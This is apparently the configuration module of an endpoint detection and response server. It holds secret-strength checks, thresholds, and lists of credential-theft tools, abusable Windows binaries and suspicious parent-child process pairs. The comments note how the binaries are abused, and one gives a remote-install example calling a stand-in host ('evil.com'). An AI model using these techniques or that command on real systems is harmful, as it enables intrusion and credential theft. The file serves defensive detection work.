# server/config.py — Master configuration (commercial-grade)
import os
import sys
import secrets

HOST  = "0.0.0.0"
PORT  = int(os.environ.get("EDR_PORT", 5000))
DEBUG = False

# ── Auth ──────────────────────────────────────────────────────────────────────
# Known-insecure placeholder values shipped in the source.
# These are ONLY accepted in explicit dev mode (EDR_DEV_MODE=true).
_INSECURE_API_KEY    = "123456789"
_INSECURE_JWT_SECRET = "change-me-in-production-min-32-chars!"
_INSECURE_FLASK_KEY  = "edr-flask-secret-change-in-production-2026"

_DEV_MODE = os.environ.get("EDR_DEV_MODE", "false").lower() == "true"

API_KEY    = os.environ.get("EDR_API_KEY",    _INSECURE_API_KEY)
JWT_SECRET = os.environ.get("EDR_JWT_SECRET", _INSECURE_JWT_SECRET)
JWT_EXPIRY = int(os.environ.get("EDR_JWT_EXPIRY", 86400))   # 24 h

# ── Secret strength validation ─────────────────────────────────────────────────
# In non-dev mode: refuse to start if any secret is still the default placeholder
# or shorter than the minimum safe length.
_MIN_API_KEY_LEN    = 32   # 32 hex chars = 128 bits entropy
_MIN_JWT_SECRET_LEN = 32

def _check_secrets():
    errors = []

    if API_KEY == _INSECURE_API_KEY:
        errors.append(
            "EDR_API_KEY is still the default '123456789'.\n"
            "  Generate one: python -c \"import secrets; "
            "print(secrets.token_hex(32))\""
        )
    elif len(API_KEY) < _MIN_API_KEY_LEN:
        errors.append(
            f"EDR_API_KEY is too short ({len(API_KEY)} chars, "
            f"minimum {_MIN_API_KEY_LEN})."
        )

    if JWT_SECRET == _INSECURE_JWT_SECRET:
        errors.append(
            "EDR_JWT_SECRET is still the default placeholder.\n"
            "  Generate one: python -c \"import secrets; "
            "print(secrets.token_urlsafe(48))\""
        )
    elif len(JWT_SECRET) < _MIN_JWT_SECRET_LEN:
        errors.append(
            f"EDR_JWT_SECRET is too short ({len(JWT_SECRET)} chars, "
            f"minimum {_MIN_JWT_SECRET_LEN})."
        )

    if errors:
        print("\n" + "═" * 65)
        print("  ✖  EDR STARTUP BLOCKED — INSECURE CONFIGURATION")
        print("═" * 65)
        for e in errors:
            print(f"\n  • {e}")
        print()
        print("  Set the environment variables above, or copy .env.example")
        print("  to .env, fill in secure values, and load it before starting:")
        print()
        print("    # Linux/macOS")
        print("    export $(grep -v '^#' .env | xargs)")
        print("    python run.py")
        print()
        print("    # PowerShell")
        print("    Get-Content .env | Where-Object { $_ -notmatch '^#' } |")
        print("    ForEach-Object { $k,$v = $_ -split '=',2; [Environment]::")
        print("    SetEnvironmentVariable($k,$v) }")
        print("    python run.py")
        print()
        print("  To bypass in a local dev/lab environment (NOT for production):")
        print("    EDR_DEV_MODE=true python run.py")
        print("═" * 65 + "\n")
        sys.exit(1)

# Only enforce on real server startup, not on every import (e.g. during tests).
# We check for the run.py entrypoint by inspecting argv[0].
import os as _os
_entrypoint = _os.path.basename(sys.argv[0]) if sys.argv else ""
_is_server_start = _entrypoint in ("run.py", "run", "__main__") or \
                   any("run.py" in a for a in sys.argv)

if not _DEV_MODE and _is_server_start:
    _check_secrets()

# ── Paths ─────────────────────────────────────────────────────────────────────
from behedr_common.paths import state_dir, writable_rules
BASE_DIR = str(state_dir("server"))
DATA_DIR = BASE_DIR
LOG_DIR = os.environ.get("EDR_LOG_DIR", os.path.join(DATA_DIR, "logs"))
DB_PATH   = os.path.join(DATA_DIR, "edr.db")
RULES_DIR = str(writable_rules("server"))
IOC_FILE  = os.path.join(DATA_DIR, "ioc_feed.json")   # local IOC cache

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(LOG_DIR,  exist_ok=True)

# ── Detection thresholds ──────────────────────────────────────────────────────
RISK_CRITICAL = 85
RISK_HIGH     = 61
RISK_MEDIUM   = 41
RISK_LOW      = 21

ALERT_DEDUP_SECS = 300
LAB_MODE = os.environ.get("EDR_LAB_MODE", "true").lower() == "true"
AUTO_RESPONSE = not LAB_MODE and os.environ.get("EDR_AUTO_RESPONSE", "false").lower() == "true"
ADVANCED_ML_ENABLED = not LAB_MODE and os.environ.get("EDR_ADVANCED_ML", "false").lower() == "true"
AUTO_KILL_SCORE  = 85

OFFLINE_THRESHOLD = 45

# ── Rate limiting ─────────────────────────────────────────────────────────────
RATE_LIMIT_EVENTS   = int(os.environ.get("EDR_RATE_EVENTS",   500))   # /events calls per minute per system
RATE_LIMIT_API      = int(os.environ.get("EDR_RATE_API",      120))   # other API calls per minute per IP

# ── ML ────────────────────────────────────────────────────────────────────────
# 100 events was far too low — Isolation Forest with contamination=0.02 needs
# at minimum 500 samples to produce a non-random model (2% × 500 = 10 anomaly
# samples, which is the practical floor for meaningful separation).
ML_TRAIN_AFTER   = 500
ML_RETRAIN_EVERY = 1000
ML_BUF_MAX       = 5000

# Path where the trained ML model is persisted across server restarts.
# On restart the model is loaded from disk — no blind period while retraining.
ML_MODEL_PATH = os.path.join(DATA_DIR, "ml_model.joblib")

# ── Graph ─────────────────────────────────────────────────────────────────────
GRAPH_MAX_NODES = 300

# ── Ingest ────────────────────────────────────────────────────────────────────
MAX_BATCH_SIZE = 200

# ── Threat Intel ─────────────────────────────────────────────────────────────
# Set VIRUSTOTAL_API_KEY to enable hash lookups against VirusTotal
VIRUSTOTAL_API_KEY   = os.environ.get("VT_API_KEY", "")
IOC_REFRESH_HOURS    = int(os.environ.get("EDR_IOC_REFRESH_HOURS", 6))

# ── Process intelligence ──────────────────────────────────────────────────────

MALICIOUS_TOOLS = {
    "mimikatz.exe", "wce.exe", "fgdump.exe", "pwdump.exe",
    "procdump.exe", "mavinject.exe", "lazagne.exe",
    "sharphound.exe", "bloodhound.exe", "rubeus.exe",
}

LOLBINS = {
    # Original set
    "mshta.exe", "regsvr32.exe", "rundll32.exe", "certutil.exe",
    "cmstp.exe", "xwizard.exe", "odbcconf.exe", "installutil.exe",
    "regasm.exe", "regsvcs.exe", "bitsadmin.exe",
    # Additional LOLBins from LOLBAS project
    "msiexec.exe",           # Remote MSI download: msiexec /i http://evil.com/x.msi
    "wscript.exe",           # Script execution proxy
    "cscript.exe",           # Script execution proxy
    "hh.exe",                # HTML Help — executes CHM payloads
    "forfiles.exe",          # Spawns child process, bypasses some controls
    "bash.exe",              # WSL execution bypass
    "wsl.exe",               # WSL execution bypass
    "wmic.exe",              # Remote execution, local process creation
    "pcalua.exe",            # Program Compatibility Assistant — proxy execution
    "ftp.exe",               # Interactive FTP — script execution
    "presentationhost.exe",  # XAML browser app execution
    "ieexec.exe",            # IE download + execute
    "mshta.exe",             # Already present — HTA execution
    "AppVLP.exe",            # App-V — script execution
    "syncappvpublishingserver.exe",   # PowerShell without powershell.exe
    "appsyncpublishingserver.exe",    # Same bypass
    "control.exe",           # Control panel — proxy for DLL execution
    "infdefaultinstall.exe", # INF script execution (like cmstp)
    "msdeploy.exe",          # Web Deploy — remote code execution
    "msconfig.exe",          # Can launch processes from Tools tab
    "replace.exe",           # File replacement — can overwrite binaries
    "extrac32.exe",          # Extract from CAB — payload delivery
    "expand.exe",            # Expand cabinet — payload delivery
    "esentutl.exe",          # Filesystem tool — can copy locked files (SAM)
    "makecab.exe",           # Create CAB — data exfil/staging
    "mavinject.exe",         # Process injection
    "Microsoft.Workflow.Compiler.exe",  # .NET workflow compiler — code exec
    "msbuild.exe",           # Build engine — executes inline C#
    "wfc.exe",               # Workflow compiler alias
    "csi.exe",               # C# REPL — code execution
    "dnscmd.exe",            # DNS admin — DLL load
    "print.exe",             # Proxy file copy
    "nltest.exe",            # Domain recon (not execution but commonly abused)
    "certreq.exe",           # Certificate request — can download files
    "desktopimgdownldr.exe", # Downloads files from URL
    "dfsvc.exe",             # ClickOnce launcher
    "diskshadow.exe",        # Shadow copy scripting — EXEC command
    "dnscmd.exe",            # Already listed
    "explorer.exe",          # Proxy execution via shell: syntax
    "msdtc.exe",             # MSDTC — DLL loading
    "ntdsutil.exe",          # AD database tool — IFM credential dump
    "pcwrun.exe",            # Program Compatibility Wizard
    "regini.exe",            # Registry modification from script
    "rpcping.exe",           # Credential capture
    "runscripthelper.exe",   # Run script helper
    "scriptrunner.exe",      # Script runner
    "stordiag.exe",          # Storage diagnostics — spawns processes
    "tttracer.exe",          # Time travel trace — can inject
    "wsreset.exe",           # Windows Store reset — UAC bypass + code exec
}

SCRIPT_ENGINES = {
    "powershell.exe", "pwsh.exe", "cmd.exe",
    "wscript.exe", "cscript.exe",
}

OFFICE_APPS = {
    "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe",
    "acrord32.exe", "wordpad.exe", "onenote.exe", "msaccess.exe",
    "mspub.exe", "visio.exe",
}

BROWSERS = {
    "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe",
    "opera.exe", "brave.exe",
}

RANSOMWARE_TOOLS = {"vssadmin.exe", "wbadmin.exe", "bcdedit.exe"}
CREDENTIAL_TOOLS = {"mimikatz.exe", "procdump.exe", "wce.exe", "fgdump.exe", "pwdump.exe"}

NEVER_KILL = {
    "lsass.exe", "csrss.exe", "smss.exe", "wininit.exe",
    "services.exe", "svchost.exe", "winlogon.exe", "explorer.exe",
    "dwm.exe", "conhost.exe", "fontdrvhost.exe", "system",
    "registry", "memory compression",
}

PROCESS_WHITELIST = {
    # ── Windows boot chain ────────────────────────────────────────────────
    ("system",        "smss.exe"),
    ("smss.exe",      "csrss.exe"),
    ("smss.exe",      "wininit.exe"),
    ("smss.exe",      "winlogon.exe"),
    ("wininit.exe",   "services.exe"),
    ("wininit.exe",   "lsass.exe"),
    ("wininit.exe",   "lsm.exe"),
    ("winlogon.exe",  "userinit.exe"),
    ("winlogon.exe",  "fontdrvhost.exe"),
    ("winlogon.exe",  "dwm.exe"),
    ("userinit.exe",  "explorer.exe"),
    # ── Services / svchost ───────────────────────────────────────────────
    # NOTE: svchost/services spawning shells IS NOT whitelisted here.
    # Those pairs are handled by L3 parent_child_analysis.yaml which applies
    # a max_score cap of 15 when user context is SYSTEM — legitimate Windows
    # maintenance. Whitelisting them entirely would let malware hiding inside
    # svchost spawn PowerShell with zero detection.
    ("services.exe",  "svchost.exe"),
    ("services.exe",  "spoolsv.exe"),
    ("services.exe",  "msiexec.exe"),
    ("svchost.exe",   "conhost.exe"),
    ("svchost.exe",   "werfault.exe"),
    ("svchost.exe",   "taskhostw.exe"),
    ("svchost.exe",   "dllhost.exe"),
    ("svchost.exe",   "msiexec.exe"),
    ("svchost.exe",   "wusa.exe"),
    # ── Explorer normal children ─────────────────────────────────────────
    # IMPORTANT: explorer → cmd/powershell/pwsh/rundll32 are intentionally
    # NOT in the hard whitelist. Reason:
    #   A user opening a shell from Explorer is normal, BUT if that shell
    #   then runs -enc / downloadstring / IEX it must still be scored by
    #   L2 heuristics. The hard whitelist stops ALL analysis — L3 safe_pairs
    #   is the right place for these (L3 zeros the pair score while L2 still
    #   runs on the cmdline).
    # Non-shell children that are always safe regardless of cmdline stay here.
    ("explorer.exe",  "taskmgr.exe"),
    ("explorer.exe",  "control.exe"),
    ("explorer.exe",  "msiexec.exe"),
    ("explorer.exe",  "notepad.exe"),
    ("explorer.exe",  "calc.exe"),
    ("explorer.exe",  "regedit.exe"),
    # ── VS Code full spawn chain ─────────────────────────────────────────
    ("code.exe",      "cmd.exe"),
    ("code.exe",      "powershell.exe"),
    ("code.exe",      "pwsh.exe"),
    ("code.exe",      "bash.exe"),
    ("code.exe",      "sh.exe"),
    ("code.exe",      "node.exe"),
    ("code.exe",      "code.exe"),
    # VS Code helper processes (actual intermediate parents)
    ("code helper (plugin)", "cmd.exe"),
    ("code helper (plugin)", "powershell.exe"),
    ("code helper (plugin)", "pwsh.exe"),
    ("code helper (plugin)", "node.exe"),
    ("code helper",   "cmd.exe"),
    ("code helper",   "powershell.exe"),
    ("code helper",   "node.exe"),
    # ── Node.js (npm scripts, webpack, jest, vitest, etc.) ───────────────
    ("node.exe",      "cmd.exe"),
    ("node.exe",      "powershell.exe"),
    ("node.exe",      "pwsh.exe"),
    ("node.exe",      "bash.exe"),
    ("node.exe",      "sh.exe"),
    ("node.exe",      "git.exe"),
    ("node.exe",      "python.exe"),
    ("node.exe",      "python3.exe"),
    # ── Python ───────────────────────────────────────────────────────────
    ("python.exe",    "cmd.exe"),
    ("python.exe",    "powershell.exe"),
    ("python.exe",    "pwsh.exe"),
    ("python3.exe",   "cmd.exe"),
    ("python3.exe",   "powershell.exe"),
    ("py.exe",        "python.exe"),
    ("py.exe",        "cmd.exe"),
    # ── Visual Studio / MSBuild ──────────────────────────────────────────
    ("devenv.exe",    "cmd.exe"),
    ("devenv.exe",    "powershell.exe"),
    ("devenv.exe",    "msbuild.exe"),
    ("msbuild.exe",   "cmd.exe"),
    ("msbuild.exe",   "powershell.exe"),
    ("msbuild.exe",   "csc.exe"),
    # ── JetBrains ────────────────────────────────────────────────────────
    ("idea64.exe",    "cmd.exe"),
    ("idea64.exe",    "powershell.exe"),
    ("idea64.exe",    "bash.exe"),
    ("idea64.exe",    "git.exe"),
    ("idea64.exe",    "node.exe"),
    ("pycharm64.exe", "cmd.exe"),
    ("pycharm64.exe", "powershell.exe"),
    ("pycharm64.exe", "python.exe"),
    ("pycharm64.exe", "bash.exe"),
    ("rider64.exe",   "cmd.exe"),
    ("rider64.exe",   "powershell.exe"),
    ("webstorm64.exe","cmd.exe"),
    ("webstorm64.exe","node.exe"),
    ("clion64.exe",   "cmd.exe"),
    # ── Windows Terminal / console ───────────────────────────────────────
    ("windowsterminal.exe", "cmd.exe"),
    ("windowsterminal.exe", "powershell.exe"),
    ("windowsterminal.exe", "pwsh.exe"),
    ("windowsterminal.exe", "bash.exe"),
    ("wt.exe",        "cmd.exe"),
    ("wt.exe",        "powershell.exe"),
    ("wt.exe",        "pwsh.exe"),
    ("conhost.exe",   "cmd.exe"),
    ("conhost.exe",   "powershell.exe"),
    # ── Git and shells ───────────────────────────────────────────────────
    ("git.exe",       "cmd.exe"),
    ("git.exe",       "sh.exe"),
    ("git.exe",       "bash.exe"),
    ("git.exe",       "python.exe"),
    ("sh.exe",        "cmd.exe"),
    ("sh.exe",        "powershell.exe"),
    ("bash.exe",      "cmd.exe"),
    ("bash.exe",      "powershell.exe"),
    ("bash.exe",      "python.exe"),
    # ── Build systems ────────────────────────────────────────────────────
    ("make.exe",      "cmd.exe"),
    ("cmake.exe",     "cmd.exe"),
    # ── Task scheduler ───────────────────────────────────────────────────
    ("taskeng.exe",   "cmd.exe"),
    ("taskeng.exe",   "powershell.exe"),
    ("taskhostw.exe", "cmd.exe"),
    ("taskhostw.exe", "powershell.exe"),
    # ── Windows Update / installer ───────────────────────────────────────
    ("trustedinstaller.exe", "cmd.exe"),
    ("trustedinstaller.exe", "tiworker.exe"),
    ("tiworker.exe",  "cmd.exe"),
    ("tiworker.exe",  "powershell.exe"),
    ("msiexec.exe",   "msiexec.exe"),
    ("msiexec.exe",   "cmd.exe"),
    ("msiexec.exe",   "powershell.exe"),
    # ── Security tools ───────────────────────────────────────────────────
    ("mssense.exe",   "cmd.exe"),
    ("mssense.exe",   "powershell.exe"),
    ("ccmexec.exe",   "cmd.exe"),
    ("ccmexec.exe",   "powershell.exe"),
    # ── Misc ─────────────────────────────────────────────────────────────
    ("spoolsv.exe",   "splwow64.exe"),
    ("lsass.exe",     "werfault.exe"),
    ("werfault.exe",  "wermgr.exe"),
}

CRITICAL_PAIRS = {
    ("winword.exe",  "powershell.exe"), ("winword.exe",  "cmd.exe"),
    ("winword.exe",  "wscript.exe"),    ("winword.exe",  "mshta.exe"),
    ("winword.exe",  "certutil.exe"),
    ("excel.exe",    "powershell.exe"), ("excel.exe",    "cmd.exe"),
    ("excel.exe",    "wscript.exe"),    ("excel.exe",    "mshta.exe"),
    ("outlook.exe",  "powershell.exe"), ("outlook.exe",  "cmd.exe"),
    ("outlook.exe",  "wscript.exe"),
    ("powerpnt.exe", "powershell.exe"), ("powerpnt.exe", "cmd.exe"),
    ("chrome.exe",   "powershell.exe"),
    ("firefox.exe",  "powershell.exe"),
    ("msedge.exe",   "powershell.exe"),
    ("iexplore.exe", "powershell.exe"), ("iexplore.exe", "cmd.exe"),
    ("iexplore.exe", "wscript.exe"),
}
